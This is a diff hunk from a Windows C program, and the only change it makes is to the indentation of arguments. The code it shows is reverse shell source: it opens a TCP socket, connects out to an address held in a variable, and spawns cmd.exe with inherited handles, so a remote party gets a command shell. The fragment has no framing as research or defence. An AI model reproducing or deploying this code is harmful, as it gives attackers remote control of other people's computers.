@@ -31,11 +31,11 @@ int main() {
 	if (result != 0) return -1;
 
 	socket = WSASocket(AF_INET,
-					   SOCK_STREAM,
-					   IPPROTO_TCP,
-					   NULL,
-					   0,
-					   0);
+			   SOCK_STREAM,
+			   IPPROTO_TCP,
+			   NULL,
+			   0,
+			   0);
 
 	if (socket == INVALID_SOCKET) return -1;
 
@@ -45,12 +45,12 @@ int main() {
 	InetPtonA(AF_INET, pszIPAddress, &sockaddr.sin_addr.s_addr);
 	
 	result = WSAConnect(socket,
-					    (SOCKADDR*)&sockaddr,
-						sizeof(sockaddr),
-					    NULL,
-					    NULL,
-					    NULL,
-					    NULL);
+			    (SOCKADDR*)&sockaddr,
+			    sizeof(sockaddr),
+			    NULL,
+			    NULL,
+			    NULL,
+			    NULL);
 
 	if (result == SOCKET_ERROR) return -1;
 
@@ -69,15 +69,15 @@ int main() {
 
 	// executes new cmd process
 	CreateProcessA(NULL, // no applicaition
-				   cmd,  // cmd.exe
-			 	   NULL,
-				   NULL, 
-				   TRUE,
-				   0,   
-				   NULL,
-				   NULL,
-				   &si,  // process startup info
-				   &pi); // process info
+		       cmd,  // cmd.exe
+		       NULL,
+		       NULL, 
+		       TRUE,
+		       0,   
+		       NULL,
+		       NULL,
+		       &si,  // process startup info
+		       &pi); // process info
 
 	WaitForSingleObject(pi.hProcess, INFINITE); // wait to the process to be exited (hProcess)
 
